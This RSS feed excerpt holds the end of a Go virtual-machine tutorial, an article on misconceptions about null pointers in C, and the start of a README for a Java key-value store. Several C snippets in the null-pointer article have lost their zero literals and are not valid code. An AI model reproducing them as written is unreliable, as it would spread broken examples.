v</span><span>.</span><span>pc</span><span> +=</span><span> 8</span></span> <span><span> v</span><span>.</span><span>sp</span><span>++</span></span> <span><span> if</span><span> err</span><span> :=</span><span> v</span><span>.</span><span>checkStackOverflow</span><span>(); </span><span>err</span><span> !=</span><span> nil</span><span> {</span></span> <span><span> return</span><span> nil</span><span>, </span><span>err</span></span> <span><span> }</span></span> <span><span> return</span><span> nil</span><span>, </span><span>nil</span></span> <span><span>}</span></span> <span><span>func</span><span> opAdd</span><span>(</span><span>v</span><span> *</span><span>vm</span><span>) ([]</span><span>byte</span><span>, </span><span>error</span><span>) {</span></span> <span><span> if</span><span> err</span><span> :=</span><span> v</span><span>.</span><span>checkStackUnderflow</span><span>(</span><span>uint64</span><span>(</span><span>1</span><span>)); </span><span>err</span><span> !=</span><span> nil</span><span> {</span></span> <span><span> return</span><span> nil</span><span>, </span><span>err</span></span> <span><span> }</span></span> <span><span> a</span><span> :=</span><span> v</span><span>.</span><span>stack</span><span>[</span><span>v</span><span>.</span><span>sp</span><span>-</span><span>1</span><span>]</span></span> <span><span> b</span><span> :=</span><span> v</span><span>.</span><span>stack</span><span>[</span><span>v</span><span>.</span><span>sp</span><span>-</span><span>2</span><span>]</span></span> <span><span> v</span><span>.</span><span>sp</span><span> -=</span><span> 2</span></span> <span><span> v</span><span>.</span><span>stack</span><span>[</span><span>v</span><span>.</span><span>sp</span><span>] </span><span>=</span><span> a</span><span> +</span><span> b</span></span> <span><span> v</span><span>.</span><span>sp</span><span>++</span></span> <span><span> if</span><span> err</span><span> :=</span><span> v</span><span>.</span><span>checkStackOverflow</span><span>(); </span><span>err</span><span> !=</span><span> nil</span><span> {</span></span> <span><span> return</span><span> nil</span><span>, </span><span>err</span></span> <span><span> }</span></span> <span><span> return</span><span> nil</span><span>, </span><span>nil</span></span> <span><span>}</span></span> </code></pre> <h2>Virtual Machine</h2><p>Next, we will define our VM as a Go&rsquo;s <code>struct</code> type.</p><pre><code><span><span>type</span><span> JumpTable</span><span> [</span><span>1</span><span> &lt;&lt;</span><span> 16</span><span>]</span><span>opFunc</span></span> <span><span>type</span><span> vm</span><span> struct</span><span> {</span></span> <span><span> stack</span><span> []</span><span>uint64</span><span> // stack</span></span> <span><span> pc</span><span> uint64</span><span> // program counter</span></span> <span><span> sp</span><span> uint64</span><span> // stack pointer</span></span> <span><span> bytecode</span><span> []</span><span>byte</span><span> // compiled bytecode</span></span> <span><span> memory</span><span> []</span><span>byte</span><span> // memory</span></span> <span><span> jumpTable</span><span> JumpTable</span></span> <span><span>}</span></span></code></pre> <ol> <li><code>stack []uint64</code> <ul> <li>Represents the stack used by the VM</li> <li>Each element in the stack is 64 bits in size (<code>uint64</code>)</li> </ul> </li> <li><code>pc uint64</code> <ul> <li>Stands for the program counter</li> <li>Indicates the current position of the VM within the bytecode</li> </ul> </li> <li><code>sp uint64</code> <ul> <li>Represents the stack pointer</li> <li>Points to the top of the stack, indicating the next available location for pushing data</li> <li>Changes dynamically as the VM executes instructions that manipulate the stack</li> </ul> </li> <li><code>bytecode []byte</code> <ul> <li>Holds the compiled bytecode of the program</li> <li>Bytecode consists of low-level instructions that the VM executes</li> </ul> </li> <li><code>memory []byte</code> <ul> <li>Represents the memory space available to the VM</li> <li>Used for storing data required during program execution, such as variables and constants</li> </ul> </li> <li><code>jumpTable JumpTable</code> <ul> <li>A mapping table for each opcode to its corresponding opcode function (<code>opFunc</code>)</li> <li>During execution, the VM uses this table to efficiently look up the operation function associated with each opcode in the bytecode</li> </ul> </li> </ol> <h2>Stack Operation</h2><p>The crucial component for stack operations is the stack itself and its pointer, commonly referred to as the <strong>Stack Pointer (SP</strong>). The stack pointer is an internal pointer that keeps track of the top of the stack, which is the location for the next item to be placed on.</p><p>Each time an item is pushed onto the stack, the stack pointer increments; conversely, it decrements every time an item is popped off.</p><p>For Example: Imagine a scenario in a VM where the stack starts empty and the following operations (opcodes) occur:</p><ol> <li><strong>PUSH8 0x3</strong> - places the value 3 at the current stack pointer location and increments the pointer.</li> <li><strong>PUSH8 0x8</strong> - places the value 8 at the new stack pointer location, incrementing the pointer again.</li> <li><strong>ADD</strong> - pops the top two values, adds them, and pushes the result back onto the stack, adjusting the stack pointer appropriately.</li> </ol><p>Here&rsquo;s how the stack and the stack pointer change with each operation:</p><ul> <li><strong>Initial State</strong>: Stack is empty, SP = 0</li> <li><strong>After PUSH8 0x3</strong>: Stack = [3], SP = 1</li> <li><strong>After PUSH8 0x8</strong>: Stack = [3, 8], SP = 2</li> <li><strong>After ADD</strong>: Stack = [11], SP = 1</li> </ul> <h2>Compiling Instruction into Byte Code</h2><p>Instructions for the VM will be specified in the following string format</p><pre><code><span><span>// This is comment line</span></span> <span><span>PUSH8 0x48656C6C6F20576F</span></span> <span><span>PUSH1 0x00</span></span> <span><span>STORE8</span></span> <span><span>PUSH8 0x726C642100000000</span></span> <span><span>PUSH1 0x08</span></span> <span><span>STORE8</span></span> <span><span>PUSH1 0x0C</span></span> <span><span>PUSH1 0x00</span></span> <span><span>RETURN</span></span></code></pre><p>Each line represents a single instruction using the defined <code>opcode</code>. Only <code>PUSH1</code> and <code>PUSH8</code> require an operand for the data to be pushed into the stack in hexadecimal representation.</p><p>Any line that starts with <code>//</code> or is empty will be ignored by the compiler.</p><p>Following the the compiled bytecode in hexadecimal representation.</p><pre><code><span><span>02 48 65 6C 6C 6F 20 57 6F 01 00 09 02 72 6C 64 21 00 00 00 00 01 08 09 01 0C 01 00 0A</span></span></code></pre><p>Which can be mapped into the instruction as followed</p><pre><code><span><span>// This is comment line</span></span> <span><span>PUSH8 0x48656C6C6F20576F - 02 48 65 6C 6C 6F 20 57 6F</span></span> <span><span>PUSH1 0x00 - 01 00</span></span> <span><span>STORE8 - 09</span></span> <span><span>PUSH8 0x726C642100000000 - 02 72 6C 64 21 00 00 00 00</span></span> <span><span>PUSH1 0x08 - 01 08</span></span> <span><span>STORE8 - 09</span></span> <span><span>PUSH1 0x0C - 01 0C</span></span> <span><span>PUSH1 0x00 - 01 00</span></span> <span><span>RETURN - 00 0A</span></span></code></pre> <h2>Execution of Byte Code</h2><p><strong>Program Counter (PC)</strong> is used to track the execution of bytecode instructions. The PC points to the address of the current instruction that the VM is executing.</p><p>As each instruction is processed, the PC is incremented to point to the next instruction, ensuring that operations are carried out in the correct sequence.</p><pre><code><span><span>02 48 65 6C 6C 6F 20 57 6F 01 00 09 02 72 6C 64 21 00 00 00 00 01 08 09 01 0C 01 00 0A</span></span></code></pre><p>Here&rsquo;s how the Program Counter (PC) operates through the sequence of bytecode from earlier example:</p><ol> <li><strong>PC = 0</strong>: <ul> <li><strong>Reads opcode <code>02</code> (PUSH8)</strong>, indicating the operation to push 8 bytes into the stack.</li> <li><strong>Increment PC by 1</strong> to start reading data for this opcode.</li> <li><strong>Data read</strong>: <code>48 65 6C 6C 6F 20 57 6F</code> from PC=1 to PC=8.</li> <li><strong>Update PC by 8</strong> after reading 8 bytes of data, now PC = 9.</li> </ul> </li> <li><strong>PC = 9</strong>: <ul> <li><strong>Reads opcode <code>01</code> (PUSH1)</strong>, indicating the operation to push 1 byte into the stack.</li> <li><strong>Increment PC by 1</strong> to read the data for this opcode.</li> <li><strong>Data read</strong>: <code>00</code> at PC=10.</li> <li><strong>Update PC by 1</strong> after reading the byte, now PC = 11.</li> </ul> </li> <li><strong>PC = 11</strong>: <ul> <li><strong>Reads opcode <code>09</code> (STORE8)</strong>, indicating the operation to pop items from the stack and store them.</li> <li><strong>Increment PC by 1</strong> to move to the next part of the instruction or the next opcode.</li> </ul> </li> <li><strong>Continues through the sequence</strong>: As each opcode is processed, the PC is incremented by 1 to read the opcode, and then further incremented as per the number of bytes the opcode processes. This ensures each instruction is executed in the correct order.</li> </ol> <h2>Memory Operation</h2><p>In the VM, the <code>memory []byte</code> field is a byte array that represents the VM&rsquo;s memory space, designed to store data throughout the lifecycle of the VM&rsquo;s operation.</p><p>Using the following example, let&rsquo;s visualize the changes to the VM&rsquo;s memory:</p><pre><code><span><span>PUSH8 0x48656C6C6F20576F // Push "Hello Wo" onto the stack</span></span> <span><span>PUSH1 0x08 // Push the memory offset 8 onto the stack</span></span> <span><span>STORE8 // Store 8 bytes at memory offset 8</span></span></code></pre> <ol> <li><code>PUSH8 0x48656C6C6F20576F</code> <ul> <li>This instruction pushes the 8-byte value corresponding to the ASCII string &ldquo;Hello Wo&rdquo; onto the stack. The hexadecimal <code>0x48656C6C6F20576F</code> directly translates to the string &ldquo;Hello Wo&rdquo;.</li> <li><strong>Effect on Stack</strong>: <ul> <li>Stack before operation: <code>[]</code></li> <li>Stack after operation: <code>[0x48656C6C6F20576F]</code></li> <li>The stack now contains one item, the 8-byte string &ldquo;Hello Wo&rdquo;.</li> </ul> </li> </ul> </li> <li><code>PUSH1 0x08</code> <ul> <li>This instruction pushes a 1-byte value <code>0x08</code> onto the stack. In this context, <code>0x08</code> represents the memory offset where the previously pushed data (&ldquo;Hello Wo&rdquo;) will be stored.</li> <li><strong>Effect on Stack</strong>: <ul> <li>Stack before operation: <code>[0x48656C6C6F20576F]</code></li> <li>Stack after operation: <code>[0x48656C6C6F20576F, 0x08]</code></li> <li>The stack now has two items: the &ldquo;Hello Wo&rdquo; data and the memory offset <code>0x08</code>.</li> </ul> </li> </ul> </li> <li><code>STORE8</code> <ul> <li>This instruction takes the two items from the top of the stack: the 8-byte data (&ldquo;Hello Wo&rdquo;) and the 1-byte memory offset (<code>0x08</code>). It stores the 8-byte data at the specified memory offset in the VM&rsquo;s memory.</li> <li><strong>Effect on Memory and Stack</strong>: <ul> <li>Memory before operation: <code>[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...]</code></li> <li>Memory after operation: <code>[00 00 00 00 00 00 00 00 48 65 6C 6C 6F 20 57 6F ...]</code></li> <li>The bytes <code>48 65 6C 6C 6F 20 57 6F</code> (representing &ldquo;Hello Wo&rdquo;) are stored starting at memory offset <code>0x08</code>.</li> <li>Stack after operation: <code>[]</code></li> <li>The stack is cleared of both items used by the <code>STORE8</code> operation.</li> </ul> </li> </ul> </li> </ol> <h2>Program Output</h2><p>The opcode <code>RETURN</code> provides a mechanism for returning data from the VM&rsquo;s memory to the calling code . It reads the specified memory offset and size from the stack and returns the data as a byte array.</p><p>Let&rsquo;s consider the sequence in the provided example, culminating in the use of the <code>RETURN</code> opcode:</p><pre><code><span><span>PUSH8 0x48656C6C6F20576F</span></span> <span><span>PUSH1 0x00</span></span> <span><span>STORE8</span></span> <span><span>PUSH8 0x726C642100000000</span></span> <span><span>PUSH1 0x08</span></span> <span><span>STORE8</span></span> <span><span>// Memory at this point</span></span> <span><span>// [48 65 6C 6C 6F 20 57 6F 72 6C 64 21 00 00 00 00 00 ...]</span></span> <span><span>PUSH1 0x0C // Pushes the size of the data to return</span></span> <span><span>PUSH1 0x00 // Pushes the starting memory offset for the return</span></span> <span><span>RETURN</span></span></code></pre> <ol> <li><code>PUSH1 0x0C</code> <ul> <li>This pushes <code>0x0C</code> onto the stack, which represents the size of the data (12 bytes) to be returned. This size indicates how many bytes following the specified offset should be returned.</li> </ul> </li> <li><code>PUSH1 0x00</code> <ul> <li>This pushes <code>0x00</code> onto the stack, indicating the memory offset from which the return should begin.</li> </ul> </li> <li><code>RETURN</code> <ul> <li>This opcode functions by retrieving the offset (<code>0x00</code>) and size (<code>0x0C</code>) from the stack. It then accesses the VM&rsquo;s memory starting from this offset and reads the specified number of bytes to form the returned byte array.</li> <li>The returned data would consist of the first 12 bytes of memory, corresponding to the sequence <code>[48 65 6C 6C 6F 20 57 6F 72 6C 64 21]</code>, which is the ASCII representation of &ldquo;Hello World!&rdquo;.</li> </ul> </li> </ol> <h2>Running the Virtual Machine</h2><p>The source code for the virtual machine (VM) is available at <a href="https://github.com/PhakornKiong/go-vm">GitHub - PhakornKiong/go-vm</a>.</p><p>To operate the VM and execute instructions, use the command <code>go run main.go -i examples/addition</code> to run an example instruction set from the <code>examples</code> folder.</p><p>For output customization, the <code>-t</code> flag allows you to specify the output data type, determining how the results are formatted and displayed.</p></article> </section>]]></description><pubDate>Mon, 15 Sep 2025 13:06:44 +0530</pubDate></item><item><link>https://purplesyringa.moe/blog/falsehoods-programmers-believe-about-null-pointers/</link><title>Falsehoods programmers believe about null pointers (purplesyringa.moe)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhekur/falsehoods_programmers_believe_about_null_pointers/</guid><comments>https://www.reddit.com/r/programming/comments/1nhekur/falsehoods_programmers_believe_about_null_pointers/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 15 min | <a href='https://www.reddit.com/r/programming/comments/1nhekur/falsehoods_programmers_believe_about_null_pointers/'>Post permalink</a></p></section><section class='preview-image'><img src='https://purplesyringa.moe/blog/falsehoods-programmers-believe-about-null-pointers/og.png' /></section><section class='parsed-content'><div><p><time>January 30, 2025</time><a href="https://news.ycombinator.com/item?id=42894220"> Hacker News</a><a href="https://www.reddit.com/r/programming/comments/1ieagxg/falsehoods_programmers_believe_about_null_pointers/"> Reddit</a></p><blockquote><p><em>Added on February 1</em>: This article assumes you know what UB is and why you shouldn&rsquo;t trigger it, very basic knowledge of how CPUs work, and an ability to take exact context into account without overgeneralizing specifics. These falsehoods are misconceptions because they don&rsquo;t apply globally, not because their inverse applies globally. If any of that is a problem to you, reading this will do more harm than good to your software engineering capabilities, and I&rsquo;d advise against interacting with this post. Check out the comments on Reddit for what can go wrong if you attempt that regardless.</p></blockquote><p>Null pointers look simple on the surface, and that&rsquo;s why they&rsquo;re so dangerous. As compiler optimizations, intuitive but incorrect simplifications, and platform-specific quirks have piled on, the odds of making a wrong assumption have increased, leading to the proliferation of bugs and vulnerabilities.</p><p>This article explores common misconceptions about null pointers held by many programmers, starting with simple fallacies and working our way up to the weirdest cases. Some of them will be news only to beginners, while others may lead experts down the path of meticulous fact-checking. Without further ado, let&rsquo;s dive in.</p><p><strong>Dereferencing a null pointer immediately crashes the program.</strong></p><p>Everyone&rsquo;s first attempt to dereference a null pointer in C, C++, or Rust results either in <code>STATUS_ACCESS_VIOLATION</code> or a dreaded <code>Segmentation fault (core dumped)</code> message, which gives this misconception some credibility. However, higher-level languages and libraries like <a href="https://chromium.googlesource.com/crashpad/crashpad">Crashpad</a> can handle the error and print a nice message and a backtrace before the crash. This is implemented by installing a <a href="https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling">vectored exception handler</a> on Windows and a <a href="https://en.wikipedia.org/wiki/C_signal_handling">signal handler</a> on Unix-like platforms.</p><p><strong>Dereferencing a null pointer eventually leads to program termination.</strong></p><p>While dereferencing a null pointer is a Bad Thing, it is by no means unrecoverable. Vectored exception and signal handlers can resume the program (perhaps from a different code location) instead of bringing the process down. For example, Go translates nil pointer dereferences to panics, which can be caught in user code with <a href="https://go.dev/blog/defer-panic-and-recover">recover</a>, and Java translates them to <code>NullPointerException</code>, which can also be caught by user code like any other exception.</p><p>In both cases, asking for forgiveness (dereferencing a null pointer and then recovering) instead of permission (checking if the pointer is null before dereferencing it) is an optimization. Comparing all pointers with null would slow down execution when the pointer <em>isn&rsquo;t</em> null, i.e. in the majority of cases. In contrast, signal handling is zero-cost until the signal is generated, which happens exceedingly rarely in well-written programs.</p><p><strong>Dereferencing a null pointer always causes a signal, an exception, or is otherwise rejected by hardware.</strong></p><p>Let&rsquo;s ignore undefined behavior for now and assume that the dereference is not optimized out.</p><p>Before virtual memory was a thing, almost all memory was accessible. For example, x86 in real mode stored interrupt tables at addresses from <code>0</code> to <code>1024</code>. From the hardware point of view, dereferencing a null pointer is no different from dereferencing other pointers, and as such, it simply accessed memory at address <code>0</code>.</p><p>This is still the case on many embedded platforms. Dereferencing a null pointer is still considered UB, so if, for whatever reason, you need to access address <code>0</code>, there are two major ways to do this:</p><ol><li>You can write the relevant code in assembly, which does not have UB.</li><li>If the hardware ignores the topmost bits of the address, you can access <code>0x80000000</code> (or similar) from C instead.</li></ol><p><strong>On modern conventional platforms, dereferencing a null pointer always causes a signal, an exception, or is otherwise rejected by hardware.</strong></p><p>Linux supports a <a href="https://man7.org/linux/man-pages/man2/personality.2.html">personality flag</a> called <code>MMAP_PAGE_ZERO</code> for compatibility with programs developed for System V. Running a program under <code>setarch -Z</code> executes it with address <code>0</code> to <code>4096</code> (or whatever your page size is) mapped to a page of zeroes. Alternatively, you can use <code>mmap</code> to place memory at address <code>0</code> by hand. Many years ago, Wine used this trick (among others, like patching LDT) to run DOS applications without DOSBox.</p><p>This no longer works by default for security reasons. One man&rsquo;s treasure is another man&rsquo;s trash: if the kernel accidentally dereferences a null pointer while the memory at address <code>0</code> is mapped, it might interpret user-supplied data as a kernel data structure, which facilitates exploits. However, you can still enable this explicitly by running <code>sudo sysctl vm.mmap_min_addr=0</code>.</p><p>Despite this, there&rsquo;s a very modern and common platform that still maps memory at address <code>0</code>. It&rsquo;s WebAssembly. Isolation within a wasm container is unnecessary, so this does not ease security exploits, and as such, dereferencing a null pointer still works here.</p><p><strong>Dereferencing a null pointer always triggers &ldquo;UB&rdquo;.</strong></p><p>This one&rsquo;s tricky. The standard does say this triggers Undefined Behavior, but what this phrase <em>means</em> has significantly changed over time.</p><p>In ye olden times, the C standard was considered guidelines rather than a ruleset, <em>undefined behavior</em> was closer to <em>implementation-defined behavior</em> than dark magic, and optimizers were stupid enough to make that distinction irrelevant. On a majority of platforms, dereferencing a null pointer compiled and behaved exactly like dereferencing a value at address <code>0</code>.</p><p>For all intents and purposes, UB as we understand it today with spooky action at a distance didn&rsquo;t exist.</p><p>For example, the <a href="https://stackoverflow.com/questions/58843458/hp-ux-cc-uses-a-default-setting-to-allow-null-dereferences-is-that-possible-in">HP-UX C compiler</a> had a CLI option to map a page of zeroes at address <code>0</code>, so that <code>*(int*)NULL</code> would return <code>0</code>. Certain programs relied on this behavior and had to be patched to run correctly on modern operating systems &ndash; or be executed with a personality flag.</p><hr><p>Now we enter the cursed territory.</p><p><strong>The null pointer has address <code>0</code>.</strong></p><p>The C standard does not require the null pointer to have address <code>0</code>. The only requirement it imposes is for <code>(void*)x</code> to evaluate to a null pointer, where <code>x</code> is <em>a compile-time constant equal to zero</em>. Such patterns can easily be matched in compile time, so null pointers can have addresses other than <code>0</code>. Similarly, casting a pointer to a boolean (as in <code>if (p)</code> and <code>!p</code>) is required to produce <code>false</code> for null pointers, not for zero pointers.</p><p>This is not a hypothetical: <a href="https://c-faq.com/null/machexamp.html">some real architectures</a> and C interpreters use non-zero null pointers. <code>fullptr</code> is not really a joke.</p><p>If you&rsquo;re wondering, Rust and other modern languages usually don&rsquo;t support this case.</p><p><strong>The null pointer has address <code>0</code> on modern platforms.</strong></p><p>On GPU architectures like <a href="https://reviews.llvm.org/D26196">AMD GCN</a> and <a href="https://what.thedailywtf.com/topic/8661/sometimes-checking-for-null-pointers-is-a-mistake-nvidia-cuda/13">NVIDIA Fermi</a>, <code>0</code> points to accessible memory. At least on AMD GCN, the null pointer is represented as <code>-1</code>. (I&rsquo;m not sure if that holds for Fermi, but that would be reasonable.)</p><p><strong>Since <code>(void*)0</code> is a null pointer, <code>int x = 0; (void*)x</code> must be a null pointer, too.</strong></p><p>In <code>int x = 0; (void*)x</code>, <code>x</code> is not a constant expression, so the standard does not require it to produce a null pointer. Runtime integer-to-pointer casts are often no-ops, so adding <code>if (x == 0) x = ACTUAL_NULL_POINTER_ADDRESS;</code> to every cast would be very inefficient, and generating a null pointer conditional on optimizations seeing through runtime values would be unnecessarily inconsistent.</p><p>Obviously, <code>void *p; memset(&amp;p, 0, sizeof(p)); p</code> is not guaranteed to produce a null pointer either.</p><p><strong>On platforms where the null pointer has address <code>0</code>, C objects may not be placed at address <code>0</code>.</strong></p><p>A pointer to an object is not a null pointer, even if it has the same address.</p><p>If you know what pointer provenance is, pointers with the same bitwise representation behaving differently shouldn&rsquo;t be news to you:</p><pre><code><span>int</span> x[<span>1</span>]; <span>int</span> y = ; <span>int</span> *p = x + <span>1</span>; <span>// This may evaluate to true</span> <span>if</span> (p == &amp;y) { <span>// But this will be UB even though p and &amp;y are equal</span> *p; } </code></pre><p>Similarly, objects can be placed at address <code>0</code> even though pointers to them will be indistinguishable from <code>NULL</code> in runtime:</p><pre><code><span>int</span> tmp = <span>123</span>; <span>// This can be placed at address 0</span> <span>int</span> *p = &amp;tmp; <span>// Just a pointer to 0, does not originate from a constant zero</span> <span>int</span> *q = <span>NULL</span>; <span>// A null pointer because it originates from a constant zero</span> <span>// p and q will have the same bitwise representation, but...</span> <span>int</span> x = *p; <span>// produces 123</span> <span>int</span> y = *q; <span>// UB</span> </code></pre><p><strong>On platforms where the null pointer has address <code>0</code>, <code>int x = 0; (void*)x</code> is a null pointer.</strong></p><p>The result of an integer-to-pointer conversion is implementation-defined. While a null pointer is an obvious candidate, this can also produce an invalid pointer or even a dereferenceable pointer to an object at address <code>0</code>. Certain compilers <a href="https://c-faq.com/.xx/q5.19.html">encouraged</a> this pattern for accessing memory at address <code>0</code> soundly:</p><pre><code><span>int</span> *p = (<span>void</span>*); <span>// Must produce a NULL pointer</span> <span>int</span> x = *p; <span>// UB</span> <span>int</span> zero = ; <span>int</span> *q = (<span>void</span>*)zero; <span>// May produce a dereferenceable pointer on some compilers</span> <span>int</span> y = *q; <span>// Not necessarily UB</span> </code></pre><p>This is mostly a C legacy: most languages don&rsquo;t differentiate between runtime and compile-time integer-to-pointer casts and will exhibit consistent behavior.</p><p><strong>On platforms where the null pointer has address <code>0</code>, <code>int x = 0; (void*)x</code> will compare equal to <code>NULL</code>.</strong></p><p>In C, pointers to objects are documented to compare as unequal to <code>NULL</code>, even if the object is at address <code>0</code>. In other words, knowing the addresses of pointers is not enough to compare them. This is one of the rare cases where provenance affects program execution in a way that does not cause UB.</p><p>The following asserts hold:</p><pre><code><span>extern</span> <span>int</span> tmp; <span>// Suppose this is at address 0</span> <span>int</span> *p = &amp;tmp; assert(p != <span>NULL</span>); <span>// Pointer to object compares unequal to NULL</span> <span>int</span> *q = (<span>void</span>*)(<span>uintptr_t</span>)p; assert(p == q); <span>// Round-tripping produces a possibly invalid, but equal pointer</span> assert(q != <span>NULL</span>); <span>// By transitivity</span> <span>int</span> x = ; <span>int</span> *r = (<span>void</span>*)x; <span>// This is still round-tripping, lack of data dependency on p is irrelevant</span> assert(r != <span>NULL</span>); </code></pre><p>As provenance is not accessible in runtime, such comparisons can only be resolved in compile time. So if a pointer to an object might cross an FFI boundary or be passed to complex code, that object can&rsquo;t be realistically placed at address <code>0</code>.</p><p>Even if there is no object at address <code>0</code>, <code>int x = 0; (void*)x</code> is still allowed to produce a pointer that compares unequal to <code>NULL</code>, as the conversion is implementation-defined.</p><p>In Rust, objects are not allowed to be placed at address <code>0</code> explicitly.</p><p><strong>On platforms where the null pointer has address <code>0</code>, null pointers are stored as zeroes.</strong></p><p>The address of a pointer as revealed by integer casts and the bitwise representation of a pointer don&rsquo;t have to be equal, much like casting an integer to a float does not retain the bits.</p><p>Segmented addressing is a common example, but pointer authentication is a more modern instance of this effect. On ARM, the top byte of a pointer can be configured to store a cryptographic signature, which is then verified at dereference. Pointers inside <a href="https://github.com/swiftlang/llvm-project/blob/65e6c0eccdc1b63a0598b735dabaccf0d575a6b4/clang/docs/PointerAuthentication.rst#ptrauth-qualifier">__ptr_auth</a> regions are signed, storing the signature in addition to the address. Apple decided against signing null pointers, as this would make their values unpredictable during compile time. Still, this was a deliberate decision rather than an implication of the standard.</p><p>CHERI is even weirder. CHERI pointers store <eq><math><mn>128</mn></math></eq>-bit capabilities in addition to the <eq><math><mn>64</mn></math></eq>-bit address we&rsquo;re used to to protect against UAF and OOB accesses. Any pointer with address <code>0</code> is considered a null pointer, so there are effectively <eq><math><msup><mn>2</mn><mn>128</mn></msup></math></eq>-ish different null pointers, only one of which is all-zero. (This also means that comparing pointers for equality can yield different results than comparing their binary representations.)</p><p>If you extend the definition of pointers to include pointers to class members, this gets even more realistic. Pointers to members are, in effect, offsets to fields (at least if we aren&rsquo;t taking methods into account), and <code>0</code> is a valid offset, so <code>(int Class::*)nullptr</code> is usually stored as <code>-1</code>.</p><p>Null pointers are even more cursed than pointers in general, and provenance already makes pointers quite complicated. Being aware of edge cases like these is valuable to prevent accidentally non-portable code and interpret other people&rsquo;s code correctly.</p><p>But if this sounds like an awful lot to keep in mind all the time, you&rsquo;re missing the point. Tailoring rules and programs to new environments as more platforms emerged and optimizing compilers got smarter is what got us into this situation in the first place.</p><p>Many people call C a &ldquo;portable assembler&rdquo;. This is emphatically not the case. C <em>looks</em> close to hardware, but in reality this language has its own abstract machine and operational semantics. Optimization passes, code-generating backends, and libraries need to speak a platform-independent language to work in tandem, and that language is not &ldquo;whatever hardware does&rdquo;. Instead of translating what you&rsquo;d like the hardware to perform to C literally, treat C as a higher-level language, because it <em>is</em> one.</p><p>Python does not suffer from horrible memory safety bugs and non-portable behavior not only because it&rsquo;s an interpreted language, but also because software engineers don&rsquo;t try to outsmart the compiler or the runtime. Consider applying the same approach to C.</p><ul><li>Do you <em>need</em> to <code>memset</code> this structure, or will <code>= {0}</code> do the trick?</li><li>Why are you casting pointers to <code>size_t</code>? Use <code>uintptr_t</code> instead.</li><li>Why are you even round-tripping through integers? Use <code>void*</code> as an untyped/unaligned pointer type.</li><li>Instead of crafting branchless code like <code>(void*)((uintptr_t)p * flag)</code> by hand, let the compiler optimize <code>flag ? p : NULL</code> for you.</li><li>Can you store flags next to the pointer instead of abusing its low bits? If not, can you insert flags with <code>(char*)p + flags</code> instead of <code>(uintptr_t)p | flags</code>?</li></ul><p>If your spider sense tingles, consult the C standard, then your compiler&rsquo;s documentation, then ask compiler developers. Don&rsquo;t assume there are no long-term plans to change the behavior and certainly don&rsquo;t trust common sense.</p><p>When all else fails, do the next best thing: document the assumptions. This will make it easier for users to understand the limits of your software, for developers to port your application to a new platform, and for you to debug unexpected problems.</p><p><em>Next up: an architecture that stores memory addresses in IEEE-754 floats.</em></p></div></section>]]></description><pubDate>Mon, 15 Sep 2025 12:07:47 +0530</pubDate></item><item><link>https://github.com/theuntamed839/DataStore4J</link><title>Built a High-Performance Key-Value Datastore in Pure Java (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhdu6k/built_a_highperformance_keyvalue_datastore_in/</guid><comments>https://www.reddit.com/r/programming/comments/1nhdu6k/built_a_highperformance_keyvalue_datastore_in/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nhdu6k/built_a_highperformance_keyvalue_datastore_in/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hello everyone, I am excited to share a small milestone, it&#39;s the project I have been working in my free time during weekends since past 2 years.</p><p><a href="https://github.com/theuntamed839/DataStore4J">DataStore4J a key value datastore entirely written in Java, inspired by Google&#39;s LevelDB</a>, its still under development.</p><p>I’ve published some <a href="https://github.com/theuntamed839/DataStore4J/blob/main/BenchMark/readme.md">benchmarks results</a> The performance is on par with LevelDB, and for comparison I also included Facebook&#39;s RocksDB (which is a different beast altogether)</p><p>I’ve also written some documentation on the <a href="https://github.com/theuntamed839/DataStore4J/wiki">internals of the DB</a></p><p>The aim was to get it to a good comparable performance level with levelDB.</p><p>Lots of learning from this project, from database internals to Java&#39;s concurrency, to using JMH for benchmarks and Jimfs for testing.<br/>I’m the sole developer on this, so I’m sure I’ve misused Java in places, missed edge cases, or even obvious bugs. I&#39;d love to hear any feedback, and issues from those who&#39;ve tried it out.</p><p>Thank you all.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/066360a02c0226dcd3f4f8b61b9fb8c8e03b892f6223c3159680545ed5a7eee9/theuntamed839/DataStore4J' /></section><section class='parsed-content'><div><article><p>A thread-safe, high-performance key-value store, built on an LSM-tree architecture inspired by <a href="https://github.com/google/leveldb">LevelDB</a>, and written entirely in Java.</p><h3>Features:</h3><a href="https://github.com#features"></a> <ul> <li>Implemented entirely in Java (no JNI or native code).</li> <li>Thread-safe with concurrency support.</li> <li>Zero-configuration, fully embeddable library.</li> <li>Supports memory-mapped files for efficient OS-level management and FileChannel-based I/O for portability</li> <li>Uses Arena to map and unmap memory-mapped files, avoiding potential memory leaks.</li> <li>Uses Write-Ahead Logging (WAL) before memtable flush</li> </ul><p></p><h3>Getting started:</h3><a href="https://github.com#getting-started"></a><p>It is available in Maven Central as <a href="https://central.sonatype.com/artifact/io.github.theuntamed839/DataStore4J">io.github.theuntamed839:DataStore4J</a>.</p><h3>Maven:</h3><a href="https://github.com#maven"></a><div><pre><code><dependency> <groupid>io.github.theuntamed839</groupid> <artifactid>DataStore4J</artifactid> <version>0.1.0</version> </dependency> </code></pre></div><p></p><h4>Gradle:</h4><a href="https://github.com#gradle"></a><div><pre><code>implementation("io.github.theuntamed839:DataStore4J:0.1.0") </code></pre></div><h3>Requirement:</h3><a href="https://github.com#requirement"></a> <ul> <li>Java 22 or higher</li> </ul><p></p><h3>Usage:</h3><a href="https://github.com#usage"></a><div><pre><span>import</span> <span>io</span>.<span>github</span>.<span>theuntamed839</span>.<span>datastore4j</span>.<span>db</span>.<span>DB</span>; <span>import</span> <span>io</span>.<span>github</span>.<span>theuntamed839</span>.<span>datastore4j</span>.<span>db</span>.<span>DataStore4J</span>; <span>import</span> <span>io</span>.<span>github</span>.<span>theuntamed839</span>.<span>datastore4j</span>.<span>db</span>.<span>DbOptions</span>; ... <span>Path</span> <span>dbPath</span> = <span>Files</span>.<span>createDirectory</span>(<span>Path</span>.<span>of</span>(<span>"PathForDB"</span>)); <span>DbOptions</span> 